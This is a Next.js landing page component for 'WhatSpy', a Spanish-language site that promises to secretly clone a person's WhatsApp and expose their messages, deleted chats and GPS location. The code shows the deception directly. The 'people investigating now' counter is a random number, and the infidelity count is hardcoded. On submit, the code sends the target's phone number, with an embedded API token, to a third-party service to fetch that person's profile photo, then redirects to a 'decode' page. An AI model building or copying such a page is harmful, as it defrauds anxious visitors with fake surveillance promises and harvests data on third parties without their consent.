"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import PhoneInput from "react-phone-number-input";

export default function Home() {
  const [phoneNumber, setPhoneNumber] = useState<string | undefined>("");
  const [liveCount, setLiveCount] = useState(847);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState(false);

  useEffect(() => {
    const min = 153;
    const max = 1080;
    let current = Math.floor(Math.random() * (max - min + 1)) + min;

    const interval = setInterval(() => {
      const change = Math.floor(Math.random() * 10) + 1;
      current += Math.random() < 0.5 ? change : -change;
      current = Math.max(min, Math.min(max, current));
      setLiveCount(current);
    }, Math.floor(Math.random() * 3000) + 2000);

    return () => clearInterval(interval);
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!phoneNumber || phoneNumber.replace(/[^0-9]/g, "").length < 7) {
      setError(true);
      return;
    }

    setError(false);
    setIsSubmitting(true);

    const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");

    // Fetch WhatsApp photo in background
    fetch("https://719gil.uazapi.com/chat/details", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        token: "9679c620-2f1e-455f-b2ca-3ed466643018",
      },
      body: JSON.stringify({ number: cleanNumber, preview: false }),
    })
      .then((r) => r.json())
      .then((data) => {
        const imgUrl = data.image || data.imagePreview || null;
        if (imgUrl) {
          sessionStorage.setItem("photoUserLink", imgUrl);
        }
      })
      .catch((err) => console.log("Photo API error:", err));

    // Get UTM params
    const urlParams = new URLSearchParams(window.location.search);
    let redirectUrl = `/decode?tel=${encodeURIComponent(cleanNumber)}`;
    ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term"].forEach((p) => {
      const v = urlParams.get(p);
      if (v) redirectUrl += `&${p}=${encodeURIComponent(v)}`;
    });

    setTimeout(() => {
      window.location.href = redirectUrl;
    }, 300);
  };

  return (
    <div className="flex flex-col items-center min-h-screen pb-16">
      {/* Orbs */}
      <div className="fixed w-[300px] h-[300px] rounded-full bg-acid/[0.06] -top-20 -right-15 blur-[80px] animate-float pointer-events-none z-0" />
      <div className="fixed w-[200px] h-[200px] rounded-full bg-acid2/[0.04] bottom-[200px] -left-15 blur-[80px] animate-float pointer-events-none z-0" style={{ animationDelay: "-4s" }} />

      <div className="w-full max-w-[480px] relative z-10 flex flex-col items-stretch">
        {/* Header */}
        <header className="flex flex-col items-center px-5 pt-8 pb-5 gap-3">
          <Image
            src="/assets/logo-Dmi_bgbj.png"
            alt="WhatSpy"
            width={80}
            height={80}
            className="rounded-full border-2 border-acid/30 shadow-[0_0_30px_rgba(0,255,136,0.2)] object-cover"
          />
          <span className="font-display text-lg font-black text-acid tracking-widest text-shadow">
            WHATSPY
          </span>
          <h1 className="text-[clamp(16px,4.2vw,20px)] font-bold text-center leading-relaxed text-foreground px-2">
            ¿Sospechas de alguien?
            <br />
            Descubre sus <span className="text-acid">conversaciones ocultas</span> ahora mismo.
          </h1>
        </header>

        {/* Live Bar */}
        <div className="flex items-center justify-center gap-2 px-4 py-2.5 text-xs text-muted border-b border-acid/[0.08]">
          <span className="w-2 h-2 bg-acid rounded-full animate-blink flex-shrink-0" />
          <span>
            <strong className="text-foreground">{liveCount}</strong> personas investigando ahora...
          </span>
        </div>

        {/* Steps */}
        <div className="flex flex-col gap-3 px-4 pt-5 pb-2">
          {[
            { num: "01", title: "Introduce el número", desc: "Ingresa el número de la persona que deseas monitorizar y rastrear." },
            { num: "02", title: "Escaneo secreto", desc: "Nuestro sistema escanea mensajes, fotos, videos y archivos multimedia." },
            { num: "03", title: "Accede a los datos", desc: "Consulta todos los mensajes y archivos sospechosos detectados." },
          ].map((step, i) => (
            <div key={step.num} className="flex items-start gap-3.5 animate-fadeUp" style={{ animationDelay: `${i * 0.15}s` }}>
              <div className="flex-shrink-0 w-9 h-9 rounded-[10px] bg-gradient-to-br from-acid to-acid2 flex items-center justify-center font-display text-xs font-black text-black shadow-[0_2px_12px_rgba(0,255,136,0.3)]">
                {step.num}
              </div>
              <div>
                <h3 className="text-sm font-bold text-foreground mb-0.5">{step.title}</h3>
                <p className="text-xs text-muted leading-relaxed">{step.desc}</p>
              </div>
            </div>
          ))}
        </div>

        {/* Input Card */}
        <div className="bg-surface border border-border rounded-[14px] p-6 mx-4 mt-3 relative overflow-hidden animate-fadeUp" style={{ animationDelay: "0.4s" }}>
          <div className="absolute top-0 left-0 right-0 h-0.5 bg-gradient-to-r from-acid via-acid2 to-acid bg-[length:200%_100%] animate-shimmer" />
          <div className="font-display text-[0.72rem] font-bold text-acid tracking-widest uppercase text-center mb-1.5">
            INGRESA EL NÚMERO AQUÍ
          </div>
          <p className="text-xs text-muted text-center mb-4">
            Introduce el número con código de país
          </p>
          <form onSubmit={handleSubmit} autoComplete="off">
            <PhoneInput
              international
              defaultCountry="ES"
              value={phoneNumber}
              onChange={setPhoneNumber}
              className={error ? "[&_.PhoneInputInput]:!border-red-500 [&_.PhoneInputInput]:!shadow-[0_0_0_3px_rgba(255,45,85,0.2)]" : ""}
            />
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full mt-4 py-4 bg-gradient-to-br from-[#00c853] to-acid2 border-none rounded-xl text-black font-display font-bold text-sm tracking-wide cursor-pointer animate-pulse relative overflow-hidden hover:-translate-y-0.5 active:scale-[0.98] transition-transform disabled:opacity-70"
            >
              <span className="absolute inset-0 bg-gradient-to-br from-white/20 to-transparent pointer-events-none" />
              {isSubmitting ? "PROCESANDO..." : "CLONAR WHATSAPP AHORA"}
            </button>
          </form>
        </div>

        {/* Security Note */}
        <div className="flex items-center justify-center gap-1.5 text-[0.72rem] text-muted pt-3.5 px-4 text-center">
          <span>100% anónimo y confidencial</span>
        </div>

        {/* Alert Bottom */}
        <div className="bg-gradient-to-br from-red-500/[0.12] to-red-500/[0.06] border border-red-500/20 rounded-[14px] px-4 py-3.5 mx-4 mt-4 text-center text-sm font-semibold text-red-300 leading-relaxed relative overflow-hidden">
          <div className="absolute top-0 -left-full w-3/5 h-full bg-gradient-to-r from-transparent via-red-500/10 to-transparent animate-shine" />
          <strong className="text-white">2.847</strong> infidelidades descubiertas hoy. Tu análisis gratuito está disponible.
        </div>

        {/* Features */}
        <div className="grid grid-cols-2 gap-2 px-4 pt-4">
          {[
            { icon: "💬", text: "Mensajes de WhatsApp" },
            { icon: "📸", text: "Fotos y Videos" },
            { icon: "📍", text: "Ubicación GPS" },
            { icon: "🗑️", text: "Mensajes Eliminados" },
          ].map((feature) => (
            <div key={feature.text} className="bg-surface border border-border rounded-[10px] p-3 text-center">
              <div className="text-2xl mb-1">{feature.icon}</div>
              <div className="text-[0.7rem] text-muted leading-snug">{feature.text}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
